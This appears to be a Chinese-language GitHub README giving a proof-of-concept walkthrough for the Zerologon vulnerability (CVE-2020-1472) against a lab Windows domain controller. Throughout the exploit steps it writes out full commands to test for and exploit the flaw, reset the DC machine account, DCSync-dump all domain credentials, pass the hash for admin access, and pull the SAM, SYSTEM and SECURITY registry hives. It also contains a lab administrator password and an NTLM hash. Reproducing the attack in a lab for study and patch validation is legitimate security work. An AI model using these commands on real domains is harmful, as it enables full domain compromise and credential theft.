# CVE-2020-1472 POC
mac环境下通过proxychains代理的方式在window域环境中复现该漏洞。



## Environment


DC(主域控制器): 

![image-20200916113011251](README.assets/image-20200916113011251.png)



Domain User(域成员主机):

通过gost直接设置socks5正向代理。

![image-20200916113305548](README.assets/image-20200916113305548.png)



Attack Hacker(攻击机):

设置proxychains4

```
vim  /Users/xq17/.proxychains/proxychains.conf
```

增加PrxoyList列表

>[ProxyList]
>socks5 10.211.55.42 8099



Attack Tools(攻击利用工具):

```
1.git clone https://github.com/mstxq17/cve-2020-1472.git
2.pip3 install -r requirements.txt
```

如果执行出现这个错误:

![image-20200916114449062](README.assets/image-20200916114449062.png)

说明是impacket模块出现了问题,尝试卸载掉impacket模块,在github安装最新版。

```
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket && pip3 install .
```

问题即可解决。



c# 版工具: https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon



## Exploit steps

1. 本地先尝试利用域控密码,导出域机器账户的Hash,方便与修改之后来对比。

   ```
   proxychains4 secretsdump.py test.local/Administrator:'123QWEqwe!@#'@10.211.55.38 -just-dc-user "DC$"
   
   或者去掉双引号,但是要注意在linux下$代表是变量的意思记得转义。
   
   proxychains4 secretsdump.py test.local/Administrator:'123QWEqwe!@#'@10.211.55.38 -just-dc-user DC\$
   ```

   ![image-20200916115110187](README.assets/image-20200916115110187.png)

2. 使用`zerologon_tester.py`,验证是否存在漏洞

   `python3 zerologon_tester.py DC 10.211.55.38`

   ![image-20200916115408007](README.assets/image-20200916115408007.png)

   返回Success,代表存在漏洞。

3. 使用`cve-2020-1472-exploit.py`将机器账户重置

  `python3 cve-2020-1472-exploit.py dc$ 10.211.55.38`
  
  ![image-20200916115639951](README.assets/image-20200916115639951.png)
  
4. 再次查看机器密码是否修改为空。
  
  ![image-20200916115757385](README.assets/image-20200916115757385.png)
  
5. 域控的机器账户可以使用DCSync导出域内所有用户凭据

   原理:

   > ![image-20200916120658369](README.assets/image-20200916120658369.png)
   >
   > 利用DRS(Directory Replication Service,目录复制服务)协议通过IDL_DRSGetNCChanges从域控制器复制用户凭据。

   ` proxychains4 secretsdump.py test.local/dc\$@10.211.55.38 -no-pass`

   ![image-20200916120926625](README.assets/image-20200916120926625.png)

6. 恢复DC$机器账户的密码
   通过

   `proxychains4 secretsdump.py test.local/dc\$@10.211.55.38 -no-pass -just-dc | grep 'Administrator'`

   获取到域管的hash

   ![image-20200916143032315](README.assets/image-20200916143032315.png)

   ![image-20200916143104828](README.assets/image-20200916143104828.png)

   然后通过wmic, pass the hash 拿到域控制器中的本地管理员权限(域管)

   ```
   wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8adfc85c3490040e942ae1e6c68f645e test.local/Administrator@10.211.55.38
   ```

   然后分别执行,拷贝本机中SAM数据库到MAC端

   ```
   - reg save HKLM\SYSTEM system.save
   - reg save HKLM\SAM sam.save
   - reg save HKLM\SECURITY security.save
   - get system.save
   - get sam.save
   - get security.save
   - del /f system.save
   - del /f sam.save
   - del /f security.save
   ```

     ![image-20200916145737983](README.assets/image-20200916145737983.png)

   `secretsdump.py -sam sam.save -system system.save -security security.save LOCAL`

   提取出机器账号的明文hex

   ![image-20200916145937435](README.assets/image-20200916145937435.png)

   最后执行

   ```
   proxychains4 python3 restorepassword.py DC@DC -target-ip 10.211.55.38 -hexpass 87e2812ccea41210c80e298c9e2a43a249d6a4056027787774340fbfd4b5f969563803b0f1bae7ccd24b29b41ae611025f1952793562d73e7f4e0f8938b3361332b35dd5ee22785b79b922149db32dc5c9301f4fd9fd090f532575bf5197a9c9230955bfd96ab928ae66b3999730c75b8545e26770816f21f2dbf9dbb19432211a91224c4c618507f7091ae09435a13a04bad5f056e72d34a96f67fa33d50e7596eca7709f398d98ba9e07407d7b2e4b937e40d1bf5ff0eb2240bdf0e8287e26ea5f8e69219fa7b1c5aa0e0bd8b992a176c32b0efb914fa6c1e53d69179110b02dfc1b1a0e53b445b92588420af18960
   ```

   ![image-20200916155017962](README.assets/image-20200916155017962.png)

   可以看到信息完整恢复了。
   



## Question

**单域环境下:**

可以完美运行,将域控重启之后,没有什么异常,但是域成员机器dns会出现问题,不影响认证。

![image-20200916182258498](README.assets/image-20200916182258498.png)

恢复密码之后:

![image-20200916182446890](README.assets/image-20200916182446890.png)



**双域环境,一个主域DC,一个备份域控DC01:**

![image-20200916205319345](README.assets/image-20200916205319345.png)

初步获取两台域控的机器Hash,发现两者并不相同。

![image-20200916205520212](README.assets/image-20200916205520212.png)

尝试打了辅域,发现并没有影响到主域,发现ntdis.dist的数据也被同步。

![image-20200916212015947](README.assets/image-20200916212015947.png)

尝试打了下主域,`net time /domain` 和 单域环境也是会出错,但是修复密码之后就秒回复了。



新建账户能够直接同步

![image-20200916213953415](README.assets/image-20200916213953415.png)

修改密码,也不影响同步.



**个人感觉,目前没发现什么脱域的问题,建议跟着我这个流程走一次,有问题欢迎找我讨论!**



## Reference

[Netlogon特权提升漏洞 (CVE-2020-1472) 原理分析与验证](https://www.secrss.com/articles/25580)

[中文版pdf](http://mp.weixin.qq.com/s?__biz=MzU0MjUxNjgyOQ==&mid=2247485538&idx=1&sn=949fdfd17b9f18a6c39980ce591ca8e5&chksm=fb183b50cc6fb2469a75f7a124b6383e2c599a2d2fcae420444746697cddd028f74fc20a1b8c&mpshare=1&scene=23&srcid=0916FTADhDot8nkAs7LA4p4J&sharer_sharetime=1600228853864&sharer_shareid=3bdf1b0c76d4c1691e700c57f87d9c0a#rd)

[NAXG\CVE-2020-1472](https://github.com/NAXG/CVE-2020-1472)

[双域环境的搭建](https://www.cnblogs.com/zoulongbin/p/6013609.html)




